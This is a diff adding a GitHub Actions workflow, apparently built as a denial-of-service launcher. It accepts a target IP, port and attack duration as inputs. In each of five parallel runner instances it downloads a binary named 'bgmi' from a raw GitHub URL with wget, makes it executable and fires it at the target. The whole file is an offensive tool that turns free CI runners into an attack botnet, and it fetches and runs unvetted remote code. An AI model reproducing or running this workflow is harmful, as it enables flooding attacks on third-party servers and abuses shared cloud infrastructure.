@@ -1,0 +1,43 @@
+name: 🔥 DETACUP Instant Operation
+on: 
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: 'Target IP Address'
+        required: true
+        type: string
+      target_port: 
+        description: 'Target Port'
+        required: true
+        type: string
+      attack_duration:
+        description: 'Operation Duration (seconds)'
+        required: true
+        type: string
+
+permissions:
+  contents: write
+
+jobs:
+  fire:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5]
+    steps:
+      - name: 🚀 Ultra-Fast Binary Deployment
+        run: |
+          wget -q "https://raw.githubusercontent.com/flamedimdos-a11y/2/main/bgmi" -O bgmi
+          chmod +x bgmi
+          echo "✅ Binary deployment successful"
+          
+      - name: 💥 Execute Operation
+        timeout-minutes: 10
+        continue-on-error: true
+        run: |
+          echo "🎯 Target: ${{ inputs.target_ip }}:${{ inputs.target_port }}"
+          echo "⏰ Duration: ${{ inputs.attack_duration }} seconds"
+          echo "🔢 Instance: ${{ matrix.instance }}"
+          echo "🔥 Launching: ./bgmi ${{ inputs.target_ip }} ${{ inputs.target_port }} ${{ inputs.attack_duration }} 890"
+          ./bgmi "${{ inputs.target_ip }}" "${{ inputs.target_port }}" "${{ inputs.attack_duration }}" 890
+          echo "✅ Operation completed on instance ${{ matrix.instance }}"
